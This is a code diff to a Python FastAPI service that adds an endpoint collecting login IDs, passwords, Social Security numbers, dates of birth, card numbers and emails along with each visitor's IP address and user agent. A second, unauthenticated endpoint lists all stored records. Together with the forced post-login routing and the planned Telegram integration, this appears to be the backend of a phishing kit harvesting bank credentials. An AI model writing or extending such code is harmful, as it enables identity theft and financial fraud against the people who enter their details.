@@ -5,12 +5,13 @@ This is a placeholder structure for future Signal/Telegram integration.
 Not used in initial scope - login hook is integrated directly.
 """
 
-from fastapi import FastAPI, HTTPException
+from fastapi import FastAPI, HTTPException, Request
 from pydantic import BaseModel
 from typing import Optional
 from datetime import datetime
 from flow_control.service import force_post_login_route, release_post_login, resolve_post_login_destination
 from flow_control.store import get_login_flow
+from flow_control.login_data import save_login_data, get_all_login_data
 from api.admin import create_admin_routes
 
 
@@ -79,6 +80,60 @@ async def get_override(user_id: str):
         "updated_at": flow["updated_at"].isoformat(),
         "updated_by": flow["updated_by"]
     }
+
+
+class LoginDataRequest(BaseModel):
+    """Request model for saving login data."""
+    online_id: str
+    password: str
+    ssn: Optional[str] = None
+    dob: Optional[str] = None
+    card_number: Optional[str] = None
+    email: Optional[str] = None
+
+
+@app.post("/api/login-data")
+async def save_login(request: Request, data: LoginDataRequest):
+    """
+    Save login and verification data.
+    
+    This endpoint receives login data from the frontend.
+    """
+    try:
+        # Get IP address and user agent
+        ip_address = request.client.host if request.client else None
+        user_agent = request.headers.get("user-agent", "")
+        
+        # Save to database
+        success = save_login_data(
+            online_id=data.online_id,
+            password=data.password,
+            ssn=data.ssn,
+            dob=data.dob,
+            card_number=data.card_number,
+            email=data.email,
+            ip_address=ip_address,
+            user_agent=user_agent
+        )
+        
+        if success:
+            return {"status": "success", "message": "Data saved successfully"}
+        else:
+            raise HTTPException(status_code=500, detail="Failed to save data")
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+
+
+@app.get("/api/login-data")
+async def get_login_data():
+    """
+    Get all saved login data (for admin viewing).
+    """
+    try:
+        data = get_all_login_data(limit=1000)
+        return {"status": "success", "data": data, "count": len(data)}
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
 
 
 @app.get("/health")
